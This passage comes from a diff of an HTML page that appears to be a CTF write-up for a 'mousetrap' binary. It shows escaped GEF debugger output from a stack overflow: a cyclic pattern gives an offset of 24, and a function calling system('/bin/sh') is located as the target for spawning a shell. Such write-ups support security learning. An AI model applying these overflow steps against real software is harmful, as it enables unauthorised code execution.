+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zero&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PARITY&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;adjust&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INTERRUPT&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;direction&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;RESUME&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;virtualx86&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;identification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0033&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x002b&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; 
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb78&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]&quot;&lt;/span&gt;	 &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb80&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0008&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb88&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0010&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb90&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0018&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb98&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdba0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0028&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdba8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0030&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jaaaaaaakaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdbb0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0038&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;kaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;	 &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4005d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007e0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nop&lt;/span&gt;    
+     &lt;span class=&quot;mh&quot;&gt;0x4007e1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leave&lt;/span&gt;  
+ &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4007e2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Cannot&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;disassemble&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x4007e2 in `grab_cheese ()`, reason: SIGSEGV&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trace&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] 0x4007e2 → `grab_cheese()`&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Now there you can see the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;$rsp&lt;/code&gt; is replaced by variable so I took that variable and found the offset.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  pattern offset daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja
-[+] Searching 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja'
-[+] Found at offset 24 (big-endian search) 
-gef➤
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Searching&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Found&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;big&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endian&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;So a &lt;code class=&quot;highlighter-rouge&quot;&gt;Code Sequence&lt;/code&gt; accepted 24 bytes of data after that value it was overflow and gave me &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt; error you can see in the above output.&lt;/p&gt;
@@ -282,59 +290,59 @@ gef➤
 
 &lt;p&gt;Then my final task was to find the address of shell(/bin/bash or /bin/sh) inside the file. For that I again searched for the functions which seems interesting and then I found &lt;code class=&quot;highlighter-rouge&quot;&gt;cheeeeeeeese&lt;/code&gt; functions and disassemble that function.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  info functions
-All defined functions:
-Non-debugging symbols:
-0x00000000004005a0  _init
-0x00000000004005d0  strcpy@plt
-0x00000000004005e0  puts@plt
-0x00000000004005f0  system@plt
-0x0000000000400600  printf@plt
-0x0000000000400610  read@plt
-0x0000000000400620  setvbuf@plt
-0x0000000000400630  _start
-0x0000000000400660  `_dl_relocate_static_pie`
-0x0000000000400670  `deregister_tm_clones`
-0x00000000004006a0  `register_tm_clones`
-0x00000000004006e0  `__do_global_dtors_aux`
-0x0000000000400710  `frame_dummy`
-0x0000000000400717  cheeeeeeeese
-0x000000000040072a  init
-0x000000000040078b  `set_mouse_name`
-0x00000000004007c1  `grab_cheese`
-0x00000000004007e3  `deactivate_trap`
-0x0000000000400823  menu
-0x0000000000400842  main
-0x00000000004008c0  `__libc_csu_init`
-0x0000000000400930  `__libc_csu_fini`
-0x0000000000400934  `_fini`
-gef➤  disass 0x0000000000400717
-Dump of assembler code for function cheeeeeeeese:
-   0x0000000000400717 &amp;lt;+0&amp;gt;:	push   rbp
-   0x0000000000400718 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
-   0x000000000040071b &amp;lt;+4&amp;gt;:	lea    rdi,[rip+0x226]        # 0x400948
-   0x0000000000400722 &amp;lt;+11&amp;gt;:	call   0x4005f0 &amp;lt;system@plt&amp;gt;
-   0x0000000000400727 &amp;lt;+16&amp;gt;:	nop
-   0x0000000000400728 &amp;lt;+17&amp;gt;:	pop    rbp
-   0x0000000000400729 &amp;lt;+18&amp;gt;:	ret    
-End of assembler dump
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functions&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;defined&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Non&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005a0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005d0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005e0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005f0&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400600&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400610&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400620&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400630&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400660&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`_dl_relocate_static_pie`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400670&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`deregister_tm_clones`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004006a0&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`register_tm_clones`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004006e0&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`__do_global_dtors_aux`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400710&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`frame_dummy`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400717&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;cheeeeeeeese&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000040072a&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000040078b&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`set_mouse_name`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007c1&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`grab_cheese`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007e3&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`deactivate_trap`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400823&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;menu&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400842&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`__libc_csu_init`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400930&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`__libc_csu_fini`&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400934&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`_fini`&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;disass&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400717&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cheeeeeeeese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400717&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400718&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x000000000040071b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x226&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# 0x400948&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400722&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4005f0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400727&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;nop&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400728&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x0000000000400729&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;    
+&lt;span class=&quot;nx&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dump&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Then there you can find the &lt;code class=&quot;highlighter-rouge&quot;&gt;system address&lt;/code&gt; before that there should be &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; shell so checking the string at address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x400948&lt;/code&gt;.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disass cheeeeeeeese
-Dump of assembler code for function cheeeeeeeese:
-   0x0000000000400717 &amp;lt;+0&amp;gt;:	push   rbp
-   0x0000000000400718 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
-   0x000000000040071b &amp;lt;+4&amp;gt;:	lea    rdi,[rip+0x226]        # 0x400948
-   0x0000000000400722 &amp;lt;+11&amp;gt;:	call   0x4005f0 &amp;lt;system@plt&amp;gt;
-   0x0000000000400727 &amp;lt;+16&amp;gt;:	nop
-   0x0000000000400728 &amp;lt;+17&amp;gt;:	pop    rbp
-   0x0000000000400729 &amp;lt;+18&amp;gt;:	ret    
-End of assembler dump.
-gef➤  x/s 0x400948
-0x400948:	&quot;/bin/sh&quot;
-gef➤  
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;disass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cheeeeeeeese&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cheeeeeeeese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
